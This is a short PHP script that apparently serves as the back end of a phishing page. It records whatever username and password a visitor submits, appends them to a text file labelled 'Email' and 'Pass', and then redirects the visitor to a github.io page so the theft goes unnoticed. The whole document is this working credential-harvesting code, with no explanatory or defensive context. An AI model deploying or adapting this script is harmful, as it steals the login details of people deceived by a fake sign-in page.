
<?php

file_put_contents("usernames.txt", "Email: " . $_GET['username'] . " Pass: " . $_GET['password'] . "\n", FILE_APPEND);
header('Location:https://harbid5501.github.io/second-web/index.html ');
exit();
?>
